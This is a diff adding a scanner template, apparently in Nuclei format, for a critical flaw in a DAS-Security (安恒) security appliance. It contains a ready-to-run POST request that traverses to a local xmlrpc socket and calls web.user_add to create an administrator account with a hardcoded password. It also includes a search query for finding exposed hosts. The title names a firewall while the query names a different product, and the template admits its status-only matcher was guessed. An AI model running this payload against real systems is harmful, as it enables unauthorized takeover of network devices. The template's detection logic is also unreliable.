@@ -1,0 +1,240 @@
+id: poc-b14eaaf33e0e8a1e0c21
+info:
+  name: 安恒下一代防火墙存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/b14eaaf33e0e8a1e0c212f43c346fb42
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: b14eaaf33e0e8a1e0c212f43c346fb42
+    fofa: + hunter:`app.name=="安恒明御运维审计与风险控制系统"`
+http:
+- raw:
+  - 'POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 1112
+
+
+    <?xml version="1.0"?>
+
+    <methodCall>
+
+    <methodName>web.user_add</methodName>
+
+
+    <params>
+
+    <param>
+
+    <value>
+
+    <array>
+
+    <data>
+
+    <value>
+
+    <string>admin</string>
+
+
+    </value>
+
+
+    <value>
+
+    <string>5</string>
+
+
+    </value>
+
+
+    <value>
+
+    <string>10.17.1.1</string>
+
+
+    </value>
+
+
+    </data>
+
+
+    </array>
+
+
+    </value>
+
+
+    </param>
+
+
+    <param>
+
+    <value>
+
+    <struct>
+
+    <member>
+
+    <name>uname</name>
+
+
+    <value>
+
+    <string>qaxnb666</string>
+
+
+    </value>
+
+
+    </member>
+
+
+    <member>
+
+    <name>name</name>
+
+
+    <value>
+
+    <string>yuwe</string>
+
+
+    </value>
+
+
+    </member>
+
+
+    <member>
+
+    <name>pwd</name>
+
+
+    <value>
+
+    <string>Admin123..</string>
+
+
+    </value>
+
+
+    </member>
+
+
+    <member>
+
+    <name>authmode</name>
+
+
+    <value>
+
+    <string>1</string>
+
+
+    </value>
+
+
+    </member>
+
+
+    <member>
+
+    <name>deptid</name>
+
+
+    <value>
+
+    <string></string>
+
+
+    </value>
+
+
+    </member>
+
+
+    <member>
+
+    <name>email</name>
+
+
+    <value>
+
+    <string></string>
+
+
+    </value>
+
+
+    </member>
+
+
+    <member>
+
+    <name>mobile</name>
+
+
+    <value>
+
+    <string></string>
+
+
+    </value>
+
+
+    </member>
+
+
+    <member>
+
+    <name>comment</name>
+
+
+    <value>
+
+    <string></string>
+
+
+    </value>
+
+
+    </member>
+
+
+    <member>
+
+    <name>roleid</name>
+
+
+    <value>
+
+    <string>101</string>
+
+
+    </value>
+
+
+    </member>
+
+
+    </struct></value>
+
+
+    </param>
+
+
+    </params>
+
+
+    </methodCall>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
